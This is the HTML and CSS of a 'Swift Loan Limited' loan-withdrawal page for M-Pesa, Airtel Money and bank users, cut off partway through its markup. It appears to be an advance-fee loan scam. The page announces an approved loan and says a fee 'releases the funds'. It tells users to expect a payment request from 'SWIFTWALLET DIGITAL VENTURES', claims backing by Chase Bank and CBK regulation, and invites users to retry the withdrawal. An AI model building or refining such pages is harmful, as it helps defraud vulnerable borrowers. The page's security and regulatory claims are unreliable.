<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loan Withdrawal - Swift Loan Limited</title>
    <link rel="icon" type="image/png" href="swiftloan-logo.png">
    
    <!-- Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --primary-orange: #FF6B00;
            --primary-blue: #001F5C;
            --light-gray: #F5F5F5;
            --text-dark: #333;
            --white: #FFFFFF;
            --success-green: #28a745;
        }

        html {
            scroll-behavior: smooth;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: var(--text-dark);
            background: linear-gradient(135deg, #fff5eb 0%, #fff8f0 50%, #ffffff 100%);
            min-height: 100vh;
        }

        /* Header */
        header {
            background: var(--white);
            padding: 1rem 5%;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 1400px;
            margin: 0 auto;
        }

        .logo-section {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .logo-img {
            width: 50px;
            height: 50px;
            background: var(--primary-orange);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo-svg {
            fill: white;
            width: 30px;
            height: 30px;
        }

        .logo-text-container {
            display: flex;
            flex-direction: column;
        }

        .logo-main {
            font-size: 1.6rem;
            font-weight: bold;
            color: var(--primary-blue);
        }

        .logo-main span {
            color: var(--primary-orange);
        }

        .logo-tagline {
            font-size: 0.65rem;
            color: var(--primary-orange);
            letter-spacing: 1px;
        }

        .header-actions {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .btn-balance {
            background: linear-gradient(135deg, var(--success-green) 0%, #20a037 100%);
            color: var(--white);
            padding: 0.6rem 1.2rem;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
            font-size: 0.9rem;
        }

        .btn-balance:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(40, 167, 69, 0.3);
        }

        .btn-back {
            background: transparent;
            border: 2px solid var(--primary-orange);
            color: var(--primary-orange);
            padding: 0.6rem 1.2rem;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.3s;
        }

        .btn-back:hover {
            background: var(--primary-orange);
            color: var(--white);
        }

        /* Main Container */
        .main-container {
            max-width: 1200px;
            margin: 2rem auto;
            padding: 0 1rem;
        }

        .page-header {
            text-align: center;
            margin-bottom: 2rem;
        }

        .status-badge-header {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
            color: #155724;
            padding: 0.8rem 1.5rem;
            border-radius: 25px;
            font-size: 0.9rem;
            font-weight: 600;
            margin-bottom: 1.5rem;
            border: 1px solid #c3e6cb;
        }

        .page-title {
            font-size: 2.5rem;
            color: var(--primary-blue);
            margin-bottom: 1rem;
        }

        .page-title span {
            color: var(--primary-orange);
        }

        .page-subtitle {
            color: #666;
            line-height: 1.8;
            max-width: 800px;
            margin: 0 auto;
        }

        /* Alerts */
        .alert {
            padding: 1.5rem;
            border-radius: 10px;
            margin-bottom: 2rem;
            display: none;
            animation: slideIn 0.5s ease;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .alert.show {
            display: block;
        }

        .alert-success {
            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
            border: 1px solid #c3e6cb;
            color: #155724;
        }

        .alert-error {
            background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%);
            border: 1px solid #f5c6cb;
            color: #721c24;
        }

        /* Transaction Timeline */
        .transaction-timeline {
            background: var(--white);
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.08);
            margin-bottom: 2rem;
            border: 1px solid rgba(255, 107, 0, 0.1);
        }

        .transaction-timeline h2 {
            color: var(--primary-blue);
            font-size: 1.8rem;
            margin-bottom: 1.5rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .timeline-item {
            display: flex;
            gap: 1rem;
            margin-bottom: 1.5rem;
            position: relative;
            padding-left: 2.5rem;
        }

        .timeline-item::before {
            content: '';
            position: absolute;
            left: 0.75rem;
            top: 2.5rem;
            width: 2px;
            height: calc(100% + 1.5rem);
            background: linear-gradient(180deg, var(--primary-orange) 0%, transparent 100%);
        }

        .timeline-item:last-child::before {
            display: none;
        }

        .timeline-icon {
            position: absolute;
            left: 0;
            width: 35px;
            height: 35px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.9rem;
            color: white;
        }

        .timeline-icon.success {
            background: linear-gradient(135deg, var(--success-green) 0%, #20a037 100%);
        }

        .timeline-icon.pending {
            background: linear-gradient(135deg, #ffc107 0%, #ff9800 100%);
        }

        .timeline-icon.info {
            background: linear-gradient(135deg, #17a2b8 0%, #138496 100%);
        }

        .timeline-content {
            flex: 1;
        }

        .timeline-title {
            font-weight: 700;
            color: var(--primary-blue);
            margin-bottom: 0.3rem;
            font-size: 1.05rem;
        }

        .timeline-description {
            color: #666;
            font-size: 0.9rem;
            margin-bottom: 0.3rem;
        }

        .timeline-time {
            color: #999;
            font-size: 0.85rem;
        }

        /* Previous Withdrawal Card */
        .previous-withdrawal-card {
            background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
            border: 2px solid #ffc107;
            padding: 2rem;
            border-radius: 15px;
            margin-bottom: 2rem;
            display: none;
            animation: slideIn 0.5s ease;
        }

        .previous-withdrawal-card.show {
            display: block;
        }

        .previous-withdrawal-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 1.5rem;
            padding-bottom: 1rem;
            border-bottom: 2px solid rgba(0, 0, 0, 0.1);
        }

        .previous-withdrawal-header h3 {
            color: var(--primary-blue);
            font-size: 1.3rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .previous-withdrawal-details {
            background: white;
            padding: 1.5rem;
            border-radius: 10px;
            margin-bottom: 1rem;
        }

        .previous-withdrawal-row {
            display: flex;
            justify-content: space-between;
            padding: 0.7rem 0;
            border-bottom: 1px solid #f0f0f0;
        }

        .previous-withdrawal-row:last-child {
            border-bottom: none;
        }

        .previous-withdrawal-label {
            color: #666;
            font-weight: 500;
        }

        .previous-withdrawal-value {
            font-weight: 700;
            color: var(--text-dark);
        }

        .previous-withdrawal-provider {
            text-align: center;
            padding: 1rem;
            background: white;
            border-radius: 8px;
            margin-bottom: 1rem;
            font-weight: 600;
            color: var(--primary-blue);
            font-size: 1.1rem;
        }

        .btn-retry {
            background: linear-gradient(135deg, var(--primary-orange) 0%, #e65f00 100%);
            color: var(--white);
            padding: 1rem 2rem;
            border: none;
            border-radius: 10px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            width: 100%;
            box-shadow: 0 5px 20px rgba(255, 107, 0, 0.3);
        }

        .btn-retry:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(255, 107, 0, 0.4);
        }

        /* Cards */
        .card {
            background: var(--white);
            padding: 2rem;
            border-radius: 15px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.08);
            margin-bottom: 2rem;
            border: 1px solid rgba(255, 107, 0, 0.1);
        }

        .card h2 {
            color: var(--primary-blue);
            font-size: 1.8rem;
            margin-bottom: 1.5rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .status-badge {
            background: linear-gradient(135deg, var(--success-green) 0%, #20a037 100%);
            color: var(--white);
            padding: 0.4rem 1rem;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: 600;
        }

        .details-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1.5rem;
        }

        .detail-item {
            padding: 1rem;
            background: var(--light-gray);
            border-radius: 8px;
            border-left: 4px solid var(--primary-orange);
        }

        .detail-label {
            font-size: 0.85rem;
            color: #666;
            margin-bottom: 0.5rem;
        }

        .detail-value {
            font-weight: 700;
            font-size: 1.1rem;
            color: var(--text-dark);
        }

        .detail-value.primary {
            color: var(--primary-orange);
        }

        .detail-value.success {
            color: var(--success-green);
        }

        /* Balance Display */
        .balance-display {
            background: linear-gradient(135deg, var(--primary-orange) 0%, #e65f00 100%);
            color: var(--white);
            padding: 2.5rem;
            border-radius: 15px;
            text-align: center;
            margin: 2rem 0;
            box-shadow: 0 10px 30px rgba(255, 107, 0, 0.3);
        }

        .balance-label {
            font-size: 1rem;
            margin-bottom: 0.5rem;
            opacity: 0.95;
        }

        .balance-amount {
            font-size: 3rem;
            font-weight: bold;
            margin-bottom: 0.5rem;
        }

        .balance-note {
            font-size: 0.9rem;
            opacity: 0.9;
            margin-top: 1rem;
        }

        .balance-footer {
            font-size: 0.85rem;
            opacity: 0.85;
            margin-top: 0.5rem;
        }

        /* Buttons */
        .btn {
            padding: 1.2rem 2rem;
            border: none;
            border-radius: 10px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .btn-primary {
            background: linear-gradient(135deg, var(--primary-orange) 0%, #e65f00 100%);
            color: var(--white);
            box-shadow: 0 5px 20px rgba(255, 107, 0, 0.3);
        }

        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(255, 107, 0, 0.4);
        }

        .btn-secondary {
            background: transparent;
            border: 2px solid #ccc;
            color: #666;
        }

        .btn-secondary:hover {
            background: var(--light-gray);
        }

        .button-group {
            display: flex;
            gap: 1rem;
            margin-top: 2rem;
        }

        .button-group .btn {
            flex: 1;
        }

        /* Info Box */
        .info-box {
            background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
            border-left: 5px solid #ffc107;
            padding: 1.5rem;
            border-radius: 10px;
            margin: 2rem 0;
        }

        .info-box h4 {
            color: var(--primary-blue);
            margin-bottom: 1rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .info-box ul {
            padding-left: 1.5rem;
            line-height: 2;
            color: #856404;
        }

        /* Quick Links */
        .quick-links {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin-top: 2rem;
        }

        .quick-link {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 1rem;
            background: linear-gradient(135deg, #fff5eb 0%, #ffe8d4 100%);
            border-radius: 10px;
            border: 2px solid transparent;
            cursor: pointer;
            transition: 0.3s;
            text-decoration: none;
            color: var(--text-dark);
        }

        .quick-link:hover {
            border-color: var(--primary-orange);
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(255, 107, 0, 0.2);
        }

        .quick-link i {
            font-size: 1.5rem;
            color: var(--primary-orange);
        }

        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            z-index: 2000;
            justify-content: center;
            align-items: center;
            overflow-y: auto;
            padding: 2rem 0;
        }

        .modal.active {
            display: flex;
        }

        .modal-content {
            background: var(--white);
            padding: 2.5rem;
            border-radius: 15px;
            max-width: 600px;
            width: 90%;
            max-height: 90vh;
            overflow-y: auto;
            animation: modalSlideIn 0.4s ease;
        }

        @keyframes modalSlideIn {
            from {
                opacity: 0;
                transform: translateY(50px) scale(0.95);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1.5rem;
            padding-bottom: 1rem;
            border-bottom: 2px solid var(--light-gray);
        }

        .modal-title {
            color: var(--primary-blue);
            font-size: 1.5rem;
            font-weight: bold;
        }

        .close-modal {
            background: none;
            border: none;
            font-size: 2rem;
            cursor: pointer;
            color: #666;
            transition: 0.3s;
        }

        .close-modal:hover {
            color: var(--primary-orange);
        }

        /* Withdrawal Methods */
        .method-card {
            background: var(--white);
            border: 2px solid #e0e0e0;
            padding: 1.5rem;
            border-radius: 12px;
            margin-bottom: 1rem;
            cursor: pointer;
            transition: 0.3s;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .method-card:hover {
            border-color: var(--primary-orange);
            transform: translateX(5px);
            box-shadow: 0 5px 20px rgba(255, 107, 0, 0.2);
        }

        .method-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .method-icon {
            width: 50px;
            height: 50px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
        }

        .method-icon.mpesa {
            background: linear-gradient(135deg, #28a745 0%, #20a037 100%);
            color: white;
        }

        .method-icon.airtel {
            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
            color: white;
        }

        .method-icon.bank {
            background: linear-gradient(135deg, #007bff 0%, #0056b3 100%);
            color: white;
        }

        .method-details h4 {
            color: var(--primary-blue);
            margin-bottom: 0.3rem;
        }

        .method-details p {
            font-size: 0.9rem;
            color: #666;
        }

        .method-details .badge {
            display: inline-block;
            background: linear-gradient(135deg, var(--primary-orange) 0%, #e65f00 100%);
            color: white;
            padding: 0.2rem 0.6rem;
            border-radius: 12px;
            font-size: 0.75rem;
            margin-top: 0.3rem;
        }

        .method-arrow {
            font-size: 1.5rem;
            color: var(--primary-orange);
        }

        /* Form */
        .form-group {
            margin-bottom: 1.5rem;
        }

        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 600;
            color: var(--text-dark);
        }

        .form-control {
            width: 100%;
            padding: 0.9rem;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 1rem;
            transition: 0.3s;
        }

        .form-control:focus {
            outline: none;
            border-color: var(--primary-orange);
            box-shadow: 0 0 0 3px rgba(255, 107, 0, 0.1);
        }

        .form-control.error {
            border-color: #dc3545;
        }

        .error-message {
            color: #dc3545;
            font-size: 0.85rem;
            margin-top: 0.3rem;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .form-note {
            background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%);
            border: 1px solid #c8e6c9;
            padding: 1rem;
            border-radius: 8px;
            margin-top: 1.5rem;
        }

        .form-note h5 {
            color: #2e7d32;
            margin-bottom: 0.5rem;
        }

        .form-note ul {
            padding-left: 1.2rem;
            font-size: 0.85rem;
            color: #2e7d32;
            line-height: 1.8;
        }

        /* Processing Overlay */
        .processing-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, var(--primary-blue) 0%, #003580 100%);
            z-index: 10000;
            display: none;
            justify-content: center;
            align-items: center;
            color: white;
        }

        .processing-overlay.active {
            display: flex;
        }

        .processing-content {
            text-align: center;
            max-width: 600px;
            padding: 2rem;
        }

        .spinner {
            width: 80px;
            height: 80px;
            border: 6px solid rgba(255,255,255,0.3);
            border-top-color: var(--white);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 2rem;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .processing-title {
            font-size: 2rem;
            margin-bottom: 1rem;
        }

        .processing-message {
            font-size: 1.1rem;
            margin-bottom: 2rem;
            opacity: 0.9;
        }

        .processing-steps {
            background: rgba(255,255,255,0.1);
            padding: 1.5rem;
            border-radius: 10px;
            text-align: left;
            margin-bottom: 1.5rem;
        }

        .processing-step {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 1rem;
            padding: 0.8rem;
            border-radius: 8px;
            background: rgba(255,255,255,0.05);
        }

        .processing-step:last-child {
            margin-bottom: 0;
        }

        .processing-note {
            background: rgba(255, 193, 7, 0.2);
            border: 1px solid rgba(255, 193, 7, 0.4);
            padding: 1rem;
            border-radius: 10px;
            margin-bottom: 1.5rem;
        }

        .processing-footer {
            font-size: 0.9rem;
            opacity: 0.8;
        }

        /* Receipt */
        .receipt-card {
            background: white;
            border: 2px solid var(--primary-orange);
            border-radius: 15px;
            padding: 2rem;
            margin-top: 2rem;
        }

        .receipt-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 1rem;
            border-bottom: 2px solid var(--light-gray);
            margin-bottom: 1.5rem;
        }

        .receipt-logo {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .receipt-status {
            background: #ffc107;
            color: #856404;
            padding: 0.4rem 0.8rem;
            border-radius: 15px;
            font-size: 0.85rem;
            font-weight: 600;
        }

        .receipt-row {
            display: flex;
            justify-content: space-between;
            padding: 0.8rem 0;
            border-bottom: 1px solid #eee;
        }

        .receipt-row:last-child {
            border-bottom: none;
        }

        .receipt-footer {
            background: linear-gradient(135deg, #e8f5e9 0%, #c8e6c9 100%);
            padding: 1rem;
            border-radius: 10px;
            text-align: center;
            margin-top: 1.5rem;
        }

        /* Animations */
        .flowing-arrows {
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .arrow-flow {
            animation: arrow-flow 2s ease-in-out infinite;
        }

        .arrow-flow:nth-child(2) {
            animation-delay: 0.3s;
        }

        .arrow-flow:nth-child(3) {
            animation-delay: 0.6s;
        }

        @keyframes arrow-flow {
            0%, 100% {
                opacity: 0.3;
                transform: translateX(-5px) scale(0.8);
            }
            50% {
                opacity: 1;
                transform: translateX(5px) scale(1.1);
            }
        }

        /* Footer */
        footer {
            background: var(--primary-blue);
            color: var(--white);
            padding: 2rem 5% 1rem;
            margin-top: 3rem;
            text-align: center;
        }

        footer p {
            margin: 0.5rem 0;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .page-title {
                font-size: 2rem;
            }

            .balance-amount {
                font-size: 2.2rem;
            }

            .button-group {
                flex-direction: column;
            }

            .header-actions {
                gap: 5px;
            }

            .btn-balance, .btn-back {
                padding: 0.5rem 0.8rem;
                font-size: 0.85rem;
            }
        }

        @media print {
            body * {
                visibility: hidden !important;
            }

            .receipt-card, 
            .receipt-card * {
                visibility: visible !important;
            }

            .receipt-card {
                position: absolute;
                left: 0;
                top: 0;
            }
        }
    </style>
</head>
<body>
    <!-- Header -->
    <header>
        <div class="header-content">
            <div class="logo-section">
                <div class="logo-img">
                    <svg viewBox="0 0 24 24" class="logo-svg">
                        <path d="M21 7H5c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2zm0 10H5V9h16v8z"/>
                        <path d="M12 3v6l-2-2-1.41 1.41L12 12l3.41-3.59L14 7l-2 2V3h-2z"/>
                        <circle cx="17" cy="13" r="1"/>
                    </svg>
                </div>
                <div class="logo-text-container">
                    <div class="logo-main">Swift <span>Loan</span></div>
                    <div class="logo-tagline">YOUR INSTANT CASH PARTNER</div>
                </div>
            </div>
            <div class="header-actions">
                <button class="btn-balance" onclick="showBalanceInfo()">
                    <i class="fas fa-coins"></i> Balance
                </button>
                <button class="btn-back" onclick="goBack()">
                    <i class="fas fa-arrow-left"></i> Back
                </button>
            </div>
        </div>
    </header>

    <!-- Main Container -->
    <div class="main-container">
        <!-- Page Header -->
        <div class="page-header">
            <div class="status-badge-header">
                <i class="fas fa-check-circle"></i> Loan Approved & Ready
            </div>
            <h1 class="page-title">Withdraw Your <span>Loan</span></h1>
            <p class="page-subtitle">Your loan has been approved and is ready for withdrawal. Choose your preferred withdrawal method below to receive your funds instantly.</p>
        </div>

        

        <!-- Success Alert -->
        <div class="alert alert-success" id="successAlert">
            <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 1.5rem;">
                <div id="selectedMethodLogo" style="width: 50px; height: 50px; border-radius: 10px; display: flex; align-items: center; justify-content: center;"></div>
                <div style="flex: 1;">
                    <h3 style="margin-bottom: 0.5rem; display: flex; align-items: center; gap: 8px;">
                        <i class="fas fa-check-circle"></i>
                        Withdrawal Request Initiated
                    </h3>
                    <p id="selectedMethodName" style="margin: 0; font-weight: 600; font-size: 1.1rem; color: var(--primary-blue);"></p>
                </div>
            </div>
            <p id="successMessage" style="line-height: 1.8; margin-bottom: 1.5rem;"></p>
            <div id="receiptCardContainer"></div>
        </div>

        <!-- Error Alert -->
        <div class="alert alert-error" id="errorAlert">
            <h3 style="margin-bottom: 0.5rem;">
                <i class="fas fa-exclamation-circle"></i> Error
            </h3>
            <p id="errorMessage"></p>
        </div>

        <!-- Previous Withdrawal Card -->
        <div class="previous-withdrawal-card" id="previousWithdrawalCard">
            <div class="previous-withdrawal-header">
                <h3><i class="fas fa-history"></i> Previous Withdrawal Request</h3>
                <button onclick="clearPreviousWithdrawal()" style="background: none; border: none; color: #666; cursor: pointer; font-size: 0.9rem;">
                    <i class="fas fa-times"></i> Clear
                </button>
            </div>
            
            <div class="previous-withdrawal-details">
                <div class="previous-withdrawal-row">
                    <span class="previous-withdrawal-label">Loan Amount:</span>
                    <span class="previous-withdrawal-value" id="prevLoanAmount">-</span>
                </div>
                <div class="previous-withdrawal-row">
                    <span class="previous-withdrawal-label">Fee Amount:</span>
                    <span class="previous-withdrawal-value" id="prevFeeAmount">-</span>
                </div>
            </div>

            <div class="previous-withdrawal-provider">
                <i class="fas fa-wallet"></i> SwiftWallet Digital Ventures
            </div>

            <button class="btn-retry" onclick="retryWithdrawal()">
                <i class="fas fa-redo"></i> Retry Withdrawal
            </button>
        </div>

        <!-- Customer Details Card -->
        <div class="card">
            <h2><i class="fas fa-user-circle" style="color: var(--primary-orange);"></i> Customer Information <span class="status-badge">Verified</span></h2>
            <div class="details-grid">
                <div class="detail-item">
                    <div class="detail-label">Full Name</div>
                    <div class="detail-value" id="customerName">Loading...</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Phone Number</div>
                    <div class="detail-value" id="customerPhone">Loading...</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Loan ID</div>
                    <div class="detail-value primary" id="loanId">Loading...</div>
                </div>
            </div>
        </div>

        <!-- Loan Details Card -->
        <div class="card">
            <h2><i class="fas fa-file-invoice-dollar" style="color: var(--primary-orange);"></i> Loan Details</h2>
            <div class="details-grid">
                <!-- Loan Details -->
                <div class="detail-item">
                    <div class="detail-label">Loan Amount</div>
                    <div class="detail-value success" id="loanAmount">Loading...</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Processing Fee</div>
                    <div class="detail-value" style="color: var(--primary-orange);" id="processingFee">Loading...</div>
                </div>
                <div class="detail-item">
                    <div class="detail-label">Available Balance</div>
                    <div class="detail-value success" id="availableBalance">Loading...</div>
                </div>
            </div>
        </div>

        <!-- Withdrawal Section -->
        <div class="card">
            <h2><i class="fas fa-money-bill-transfer" style="color: var(--primary-orange);"></i> Withdraw My Loan</h2>
            <p style="color: #666; margin-bottom: 1.5rem;">Choose your preferred withdrawal method and complete the process</p>

            <!-- Withdrawal Amount Display -->
            <div class="balance-display">
                <div class="balance-label">
                    <i class="fas fa-coins"></i> Verified Withdrawal Amount
                </div>
                <div class="balance-amount" id="withdrawalAmount">Loading...</div>
                <div class="balance-note">Actual amount approved; withdrawable</div>
                <div class="balance-footer">
                    <i class="fas fa-university"></i> Secured by Chase Bank LMTD • 
                    <i class="fas fa-shield-alt"></i> Approved amount
                </div>
            </div>

            <!-- Action Buttons -->
            <div class="button-group">
                <button class="btn btn-secondary" onclick="goBack()">
                    <i class="fas fa-arrow-left"></i> Cancel
                </button>
                <button class="btn btn-primary" id="withdrawBtn" onclick="showWithdrawalMethods()">
                    <i class="fas fa-wallet"></i> Choose Withdrawal Method
                </button>
            </div>
        </div>

        <!-- Important Information -->
        <div class="info-box">
            <h4><i class="fas fa-lightbulb"></i> Important Information:</h4>
            <ul>
                <li>Choose from M-Pesa, Airtel Money, or Bank Transfer</li>
                <li>All withdrawal methods are secure and encrypted</li>
                <li>Funds will be credited to your account. Check updates in the system generated receipt</li>
                <li>Keep your phone nearby for confirmation process</li>
                <li>You will receive SMS confirmation once completed</li>
                <li>Verify your details carefully before proceeding</li>
                <li>NOTE that all your loan funds are securely held by Chase Bank regulated by CBK. Fee securely releases the funds to your M-Pesa, Airtel Money and Bank accounts</li>
                <li>If you encounter any problem don't hesitate to contact our support team through the blue chat widget at the bottom right side. We are always online</li>
                <li>The live loan receipt is possessed by our loan systems and shows the current status of the applicant loan. If you get any problem, download the PDF receipt and send to live support for assistance</li>
            </ul>
        </div>
    <!-- Transaction Timeline -->
        <div class="transaction-timeline" id="transactionTimeline">
            <h2><i class="fas fa-clock-rotate-left"></i> Transaction History</h2>
            <div id="timelineContainer">
                <!-- Timeline items will be inserted here -->
            </div>
        </div>

        <!-- Quick Links -->
        <div class="card">
            <h2><i class="fas fa-link"></i> Quick Links</h2>
            <div class="quick-links">
                <a href="#" class="quick-link" onclick="openHelpModal(); return false;">
                    <i class="fas fa-headset"></i>
                    <span>Contact Support</span>
                </a>
                <a href="#" class="quick-link" onclick="alert('Transaction history coming soon!'); return false;">
                    <i class="fas fa-history"></i>
                    <span>Transaction History</span>
                </a>
                <a href="#" class="quick-link" onclick="alert('FAQ section coming soon!'); return false;">
                    <i class="fas fa-question-circle"></i>
                    <span>FAQ</span>
                </a>
            </div>
        </div>
    </div>

    <!-- Withdrawal Method Modal -->
    <div class="modal" id="withdrawalMethodModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title"><i class="fas fa-wallet"></i> Select Withdrawal Method</h3>
                <button class="close-modal" onclick="closeWithdrawalModal()">&times;</button>
            </div>

            <div>
                <!-- M-Pesa -->
                <div class="method-card" onclick="selectMethod('mpesa')">
                    <div class="method-info">
                        <div class="method-icon mpesa">
                            <i class="fas fa-mobile-alt"></i>
                        </div>
                        <div class="method-details">
                            <h4>M-Pesa</h4>
                            <p>Instant mobile money transfer</p>
                            <span class="badge">Most Popular • Withdrawal updates in receipt</span>
                        </div>
                    </div>
                    <div class="method-arrow">
                        <i class="fas fa-chevron-right"></i>
                    </div>
                </div>

                <!-- Airtel Money -->
                <div class="method-card" onclick="selectMethod('airtel')">
                    <div class="method-info">
                        <div class="method-icon airtel">
                            <i class="fas fa-mobile-alt"></i>
                        </div>
                        <div class="method-details">
                            <h4>Airtel Money</h4>
                            <p>Mobile money transfer</p>
                            <span class="badge">Fast • Withdrawal updates in receipt</span>
                        </div>
                    </div>
                    <div class="method-arrow">
                        <i class="fas fa-chevron-right"></i>
                    </div>
                </div>

                <!-- Bank Transfer -->
                <div class="method-card" onclick="selectMethod('bank')">
                    <div class="method-info">
                        <div class="method-icon bank">
                            <i class="fas fa-university"></i>
                        </div>
                        <div class="method-details">
                            <h4>Bank Transfer</h4>
                            <p>Direct transfer to your bank account</p>
                            <span class="badge">Secure • Withdrawal updates in receipt</span>
                        </div>
                    </div>
                    <div class="method-arrow">
                        <i class="fas fa-chevron-right"></i>
                    </div>
                </div>
            </div>

            <p style="text-align: center; margin-top: 1.5rem; color: #666; font-size: 0.9rem;">
                <i class="fas fa-shield-alt" style="color: var(--success-green);"></i>
                Secure & Encrypted - All transactions are protected with bank-level security and 256-bit encryption
            </p>
        </div>
    </div>

    <!-- Withdrawal Details Modal -->
    <div class="modal" id="withdrawalDetailsModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title" id="detailsModalTitle">Withdrawal Details</h3>
                <button class="close-modal" onclick="closeDetailsModal()">&times;</button>
            </div>

            <div id="withdrawalForm">
                <!-- Form will be populated dynamically -->
            </div>

            <button class="btn btn-primary" onclick="processWithdrawal()" style="width: 100%; margin-top: 1.5rem;">
                <i class="fas fa-check-circle"></i> Confirm Withdrawal
            </button>
        </div>
    </div>

    <!-- Processing Overlay -->
    <div class="processing-overlay" id="processingOverlay">
        <div class="processing-content">
            <div class="spinner"></div>
            <h2 class="processing-title"><i class="fas fa-wallet"></i> Swift Loan Wallet</h2>
            <p class="processing-message">Loan Transfer to wallet was Successful & Ready for Withdrawal. Powered by CHASEBANK and regulated by CBK</p>

            <div class="processing-steps">
                <h3 style="margin-bottom: 1rem;">Processing Your Loan Withdrawal</h3>
                <div class="processing-step" id="step1">
                    <i class="fas fa-circle-notch fa-spin"></i>
                    <span id="step1Text">Initializing secure connection...</span>
                </div>
                <div class="processing-step" id="step2">
                    <i class="fas fa-circle"></i>
                    <span id="step2Text">Waiting...</span>
                </div>
                <div class="processing-step" id="step3">
                    <i class="fas fa-circle"></i>
                    <span id="step3Text">Waiting...</span>
                </div>
            </div>

            <div class="processing-note">
                <p style="font-weight: 600; margin-bottom: 0.5rem;">
                    <i class="fas fa-mobile-alt"></i> Please check your phone
                </p>
                <p style="font-size: 0.9rem;">
                    for the payment request from <strong>SWIFTWALLET DIGITAL VENTURES</strong>
                </p>
            </div>

            <div class="processing-footer">
                <p><i class="fas fa-shield-alt"></i> Bank Grade Security • 256-bit Encryption • Licensed by CBK</p>
                <p style="margin-top: 0.5rem;"><i class="fas fa-lock"></i> Validating • Processing • Confirming</p>
                <p style="margin-top: 0.5rem; font-size: 0.85rem; opacity: 0.7;">Powered by CHASEBANK</p>
            </div>
        </div>
    </div>

    <!-- Help Modal -->
    <div class="modal" id="helpModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title"><i class="fas fa-headset"></i> Need Help?</h3>
                <button class="close-modal" onclick="closeHelpModal()">&times;</button>
            </div>

            <div class="info-box" style="margin: 0;">
                <h4>Contact Support</h4>
                <p style="color: #856404; line-height: 1.8;">
                    Our support team is available 24/7 through the blue chat widget at the bottom right of your screen. 
                    Click on it to start a conversation with our team.
                </p>
            </div>

            <div class="form-note" style="margin-top: 1rem;">
